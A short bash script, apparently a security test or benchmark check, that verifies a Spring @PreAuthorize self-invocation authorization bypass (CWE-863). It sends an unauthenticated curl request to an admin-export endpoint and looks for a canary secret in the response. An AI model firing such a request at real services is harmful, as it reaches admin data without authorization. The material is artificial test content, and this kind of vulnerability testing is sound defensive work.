#!/usr/bin/env bash
# PREAUTH-BYPASS-001 (CWE-863): @PreAuthorize self-invocation bypass. A public
# service wrapper calls the admin-guarded method on `this`, which the Spring AOP
# proxy never intercepts - so an unauthenticated caller gets the admin export.
set -eu; . "$(dirname "$0")/_lib.sh"
curl -s "$TARGET/api/reports/admin-export" | grep -q 'SPRINGBOOT-PREAUTH-SECRET-7f3a'
